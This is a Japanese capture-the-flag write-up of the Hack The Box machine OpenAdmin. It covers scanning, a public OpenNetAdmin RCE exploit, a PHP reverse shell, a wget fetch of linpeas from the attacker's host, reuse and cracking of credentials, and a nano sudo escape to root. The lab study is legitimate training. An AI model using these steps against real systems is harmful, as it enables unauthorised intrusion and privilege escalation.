# はじめに
Hack The Boxの攻略などを自分用にまとめたものです。
主に記録用として記しています。
現在のランクはHackerです。
間違っていることも多いかと思いますが、よろしくお願いします。  
<img src="http://www.hackthebox.eu/badge/image/185549" alt="Hack The Box">  
チートシートも公開しておりますが知識がまだまだ不足しているため、学習経過とともに身につけた内容などを随時更新していきます。
GitHub(ペネトレーションテスト用チートシート):
https://github.com/yukitsukai47/PenetrationTesting_cheatsheet
Twitter:@yukitsukai1731

# OpenAdmin

![スクリーンショット 2020-08-04 15.40.23.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/bb26c562-8e16-6b63-93cc-467185b048fe.png)

HackTheBox公式より
OpenAdmin is an easy difficulty Linux machine that features an outdated OpenNetAdmin CMS instance. The CMS is exploited to gain a foothold, and subsequent enumeration reveals database credentials. These credentials are reused to move laterally to a low privileged user. This user is found to have access to a restricted internal application. Examination of this application reveals credentials that are used to move laterally to a second user. A sudo misconfiguration is then exploited to gain a root shell.

OpenAdmin は、時代遅れの OpenNetAdmin CMS インスタンスを特徴とする簡単な難易度の Linux マシンです。CMS は足がかりを得るために悪用され、その後の列挙でデータベースの資格情報が明らかになります。これらの資格情報は再利用されて、低特権ユーザへの移動に利用されます。このユーザーは、制限された内部アプリケーションにアクセスしていることがわかります。このアプリケーションを検査すると、2 番目のユーザに横方向に移動するために使用される資格情報が明らかになります。その後、sudo の誤設定を悪用して root シェルを取得します。

# スキャン
OpenAdmin(10.10.10.171)に対して、スキャンを行います。  
まずnmapからスキャンを開始します。
## nmap 

```
nmap -sC -sV -oN openadmin.nmap 10.10.10.171
```

- -sC...デフォルトスクリプトでスキャン
- -sV...バージョン検出
- -oN...通常出力

```
# Nmap 7.80 scan initiated Fri Jul 31 10:39:39 2020 as: nmap -sC -sV -oN openadmin.nmap 10.10.10.171
Nmap scan report for 10.10.10.171
Host is up (0.28s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jul 31 10:40:54 2020 -- 1 IP address (1 host up) scanned in 75.54 seconds
```

この結果から22、80番ポートが空いていることが分かります。  
アクセスしてみると、Apacheのデフォルトページが表示されました。
![スクリーンショット 2020-08-04 15.45.24.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/30ccf489-5286-bc42-e76e-59cf43090056.png)

ディレクトリスキャナーをかけて何か手がかりになる情報を見つけましょう。

## Gobuster

```
gobuster dir -t 25 -u http://10.10.10.171 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o openadmin.gobuster
```

```
kali@kali:~/htb/OpenAdmin$ cat openadmin.gobuster 
/music (Status: 301)
/artwork (Status: 301)
/sierra (Status: 301)
/server-status (Status: 403)
```
/music,/artwork,/sierraなどのディレクトリを発見することができました。

/music
<img width="1082" alt="スクリーンショット 2020-07-31 23.52.22.png" src="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/a9e193a6-951e-aaf5-bec8-1e670b28d476.png">

/artwork
<img width="1085" alt="スクリーンショット 2020-07-31 23.52.40.png" src="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/c9a552b0-d56b-836d-d0d6-e75f30e9ab66.png">

/sierra
![スクリーンショット 2020-08-04 15.44.08.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/5aa0b4e9-9b09-7327-3be7-769486b95ce8.png)

この中で/musicのLoginページにアクセスをすると、/onaというディレクトリに飛ばされ、OpenNetAdmin v18.1.1が稼働していることが分かります。
![スクリーンショット 2020-08-04 15.49.47.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/58291740-bc46-3e8e-6269-363b000de592.png)
![スクリーンショット 2020-08-04 15.50.01.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/88158cba-8cb4-1db0-7ff3-cea1d344d582.png)

# 侵入
OpenNetAdmin v18.1.1に刺さりそうなexploitを探します。  
今回は以下のものを使用します。
![スクリーンショット 2020-08-04 15.52.24.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/4b4847d0-e129-f3a2-f69e-4c517c011c81.png)

```
git clone https://github.com/amriunix/ona-rce.git
```
<img width="733" alt="スクリーンショット 2020-08-04 12.36.36.png" src="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/e985b742-b1ec-d777-1bba-99d7a179ed22.png">

これでwww-dataのシェルをゲットすることができました。  
このままのシェルでは使いにくいのと、挙動がおかしくなるので別のプログラムを使ってreverse_shellします。  
ここではpentestmonkeyのphp-reverse-shellを使います。  
http://pentestmonkey.net/tools/web-shells/php-reverse-shell

![コメント 2020-08-03 142011.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/303cac9c-a06a-a702-0e4c-87b99da0ffc3.png)

![コメント 2020-08-03 141906.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/d48033e1-dcf7-2d6b-9062-15cc687f9a8a.png)

![コメント 2020-08-03 141847.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/90512fd1-70a2-aee9-788b-04d968d37439.png)

これで安定したシェルを使えます。
## linpeas.sh
次に何か権限昇格に使えそうなものを探すためにlinpeas.shを使います。

https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite

```
$ wget http://10.10.14.9:8888/linpease.sh
$ chmod +x linpease.sh
$ ./linpease.sh -a
```

<img width="831" alt="スクリーンショット 2020-08-04 12.47.08.png" src="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/8c7d26d1-9398-aa4e-ba54-99604ece8b4d.png">

jimmyやjoannaといったユーザが存在しており、jimmyの権限で/var/www/internalというフォルダを見つけることができました。
![スクリーンショット 2020-08-04 18.25.01.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/8567feed-fb42-3475-951e-dfe6a4bbb743.png)

<img width="787" alt="スクリーンショット 2020-08-04 13.04.50.png" src="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/e85ff5d9-6d5a-aa0e-5a4a-c162d8eb1a90.png">


また,OpenNetAdminのコンフィグフォルダに何か情報がないか探してみると以下のdatabase_settings.inc.phpというファイルにmysqlのログインパスワードらしきものが見つかります。
<img width="493" alt="スクリーンショット 2020-08-04 13.03.13.png" src="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/053e301d-c16a-ded0-a6d3-cdc1a30366ac.png">
<img width="548" alt="スクリーンショット 2020-08-04 13.03.52.png" src="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/6bda97fc-2be3-2f15-75be-6a93e044a5ee.png">

jimmy,joannaのsshのパスワードに使いまわされていないか試してみたところ、jimmyでsshログインできることが分かります。
![スクリーンショット 2020-08-04 18.17.14.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/d137850f-cc9a-7206-6560-8a018dc06ea7.png)
しかし、jimmyはユーザフラグを所有していなかったため、joannaの方にユーザフラグがあると考えます。

joannaのアカウントを手に入れるために、linpeas.shで見つけた/var/www/internalに情報がないか探ってみます。
そうすると、配置されているindex.phpにpasswordのsha512のハッシュ値が見つかります。
<img width="1394" alt="スクリーンショット 2020-08-04 13.18.29.png" src="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/815092d8-2e3a-bcf0-4347-a6722c68fa38.png">

オンラインプラットフォームであるCrackStationで検索してみると、パスワードはRevealedであることが分かります。
<img width="1085" alt="スクリーンショット 2020-08-04 13.22.57.png" src="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/1adcd960-eebc-d676-e284-1b9f8743f97a.png">

main.phpをみるとjoannaのssh秘密鍵を生成するようなページが見つかります。
![スクリーンショット 2020-08-04 18.33.06.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/e13388f7-919d-b548-b2a6-f1601d2507c8.png)

またlinepese.shやnetstat -tulpnの結果から3306，52846ポートでプロセスが動いていることが分かります。　　
sshポートフォワーディングを使って、アクセスできるようにします。

```
ssh jimmy@10.10.10.171 -L 52846:127.0.0.1:52846
```
ここに先ほど判明したパスワード:Revealedを使ってログインします。
![スクリーンショット 2020-08-04 15.30.16.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/9c0f3374-a07a-54b7-7786-f5797842a3f9.png)

![スクリーンショット 2020-08-04 15.30.27.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/c2bbd5a8-c37b-e321-7518-07e63daf805b.png)
またmain.phpで生成されることが分かっているので、これらのことをしなくてもcurlでもssh秘密鍵を入手することができます。
<img width="610" alt="スクリーンショット 2020-08-04 13.32.38.png" src="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/73b55a57-1c40-166b-e86d-837cb75b214c.png">
これを保存してから、暗号化されている状態なのでjohnを使ってパスワードクラックをします。　　
実行すると、joannaのパスワードがbloodninjasであることが分かります。
![スクリーンショット 2020-08-04 14.26.34.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/a157f36c-4b4b-a73b-d78f-4112acab117c.png)
これらの認証情報を使ってjoannaでsshログインをしましょう。
![スクリーンショット 2020-08-04 14.45.46.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/54a8f8be-4a14-0eaf-ead3-6cd50a70c13d.png)

# 特権エスカレーション
sudo -lの結果からnano /opt/privがNOPASSWDであることが分かります。
![スクリーンショット 2020-08-04 14.46.52.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/909427a8-1dd3-8be7-e636-dc46193e302e.png)
検索したところ、下記の方法でシェルを取れそうです。
![スクリーンショット 2020-08-04 18.55.13.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/92f0e881-5f36-81cc-84c0-ceaaa67e9d34.png)

Ctrl+r,Ctrk+xを入力してから、下記のコマンドを入力して実行します。

```
reset; sh 1>&0 2>&0
```

![スクリーンショット 2020-08-04 15.18.22.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/5b863482-426d-60e6-0185-98d5093dffcd.png)

お疲れ様でした。
root権限を取得することができました。